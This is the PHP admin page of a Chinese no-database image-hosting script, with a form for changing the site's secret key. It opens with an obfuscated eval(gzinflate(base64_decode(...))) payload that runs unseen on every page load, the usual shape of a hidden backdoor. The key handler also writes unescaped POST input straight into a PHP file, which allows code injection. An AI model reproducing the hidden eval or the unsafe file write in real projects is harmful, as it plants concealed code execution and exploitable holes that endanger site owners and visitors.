<?php eval(gzinflate(base64_decode("\x66\131\65\x4e\141\64\116\101\106\x45\130\x33\x67\166\x39\150\105\107\x47\125\167\101\122\x43\63\157\x53\123\62\x46\x56\x4c\103\x45\x37\141\144\126\112\x4b\x47\x63\145\156\104\x6c\106\x6e\x2f\x43\x68\125\x53\x76\65\67\164\x54\141\x37\x74\x71\165\x37\117\x4f\146\145\71\x34\152\162\x36\x46\x71\x56\x37\x79\153\x53\x79\164\150\123\x6d\141\157\x79\x39\122\x68\62\141\110\126\x65\71\x4d\167\x57\154\x6d\67\57\x63\117\x70\x4d\65\x2f\x38\111\x46\x78\170\x75\61\116\143\146\x57\160\x6f\x6f\153\122\63\171\71\126\165\113\x79\161\121\x59\53\120\x50\x43\103\x30\60\141\x2b\150\160\117\107\x78\x6b\x4a\x2f\105\x54\x57\x55\124\124\67\111\x66\x6c\x30\156\x53\x75\127\x48\x59\x37\x70\62\x31\x38\x6d\x4b\x4b\171\x72\x41\x39\x6a\x56\101\x79\x51\x34\70\x44\x68\165\x34\141\122\172\x66\161\64\165\x6d\70\x31\167\x35\x49\146\x6e\117\170\x44\x36\x36\x54\x74\120\x65\x6d\122\67\171\143\x58\x69\104\107\x4c\161\x59\x4d\x37\x6a\x52\121\57\121\120\x49\112\157\170\117\150\156\144\120\x6f\102\x56\127\x47\111\x74\x2b\164\125\161\x32\x31\x2f\114\60\x74\163\53\64\102\x36\x62\114\x37\x4f\x50\x42\x72\165\154\152\57\115\62\x31\x35\144\x35\x77\x73\75")));?>
<?php
   if($config['admin']=='0'){
   echo "后台已关闭";
   }else{
   if($_POST){
   if ($key==$_POST['key']) {
    $_data = "<?php
    \$key= '".$_POST['keynew']."';/*
    小猫咪图床
    BY：云猫  
    QQ：3522934828
    目前对接了三楼，芥子，本地，以及小猫咪图床～
    接口能实时更新，没那么容易凉，即便全部凉了，还有一个本地呢～对吧
    前台模板随便找的，不喜欢不要喷(*'ε`*)然后随便凑起来的，不用数据库
    后台有点小丑，别骂(⋟﹏⋞)
    有木有bug没钱还不知道耶(*'へ'*)
    源码:https://ximami.lanzoui.com/b001ig23g
    这程序以后更新都会在上面那个蓝奏云里面
    学生党一枚，聊天注意点哦～
    2021.6.4
*/?>";	
			
			if (file_put_contents("../common/key.php",$_data)) {
        echo "<script>alert('修改成功啦～');window.location.href='../'</script>";
			}else{
    	echo "<script>alert('修改失败，可能出了点问题，再试试～')</script>";

			}
			}
			else{
      echo "<script>alert('密匙错误了耶(￢_￢)')</script>";
        		}
			}
			}
			
			?>
			<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="author" content="小猫咪QQ:3522934828">

	<title>小猫咪后台管理平台</title>

	<link href="https://ximami-5g3cz0aqeba76e20-1257450857.tcloudbaseapp.com/love/app.css" rel="stylesheet">
	<link rel="stylesheet" href="//ximami-5g3cz0aqeba76e20-1257450857.tcloudbaseapp.com/404/bg.css" type="text/css" />
</head>
			<main class="content">
				<div class="container-fluid p-0">
			
			<div class="col-12 col-lg-6">
     <div class="card">
		<div class="card-header">
			<h5 class="card-title mb-0">网址基本设置</h5>
		</div><hr></hr>
		<center><label class="col-sm-2 control-label">当前版本：<?php echo file_get_contents("../common/version.txt");?></label></center>
		<center><label class="col-sm-2 control-label">最新版本：<?php echo file_get_contents("http://pic.lq520.club:81/common/version.txt");?></label></center>
		最新版本下载地址https://ximami.lanzoui.com/b001ig23g
		<div class="card-body">
		<form method="post" action="">
		<div class="form-group">
	  <label class="col-sm-2 control-label">原密匙</label>
	  <div class="col-sm-10"><input type="text" name="key" value="" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">新密匙</label>
	  <div class="col-sm-10"><input type="text" name="keynew" value="" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <div class="col-sm-offset-2 col-sm-10"><input type="submit" value="保存配置" class="btn btn-primary form-control"/><br/>
	 </div>
	 </form>	 
		</div>
	</div>
</div>
</div>
</main>
<script src="https://ximami-5g3cz0aqeba76e20-1257450857.tcloudbaseapp.com/love/app.js"></script>
</body>
</html>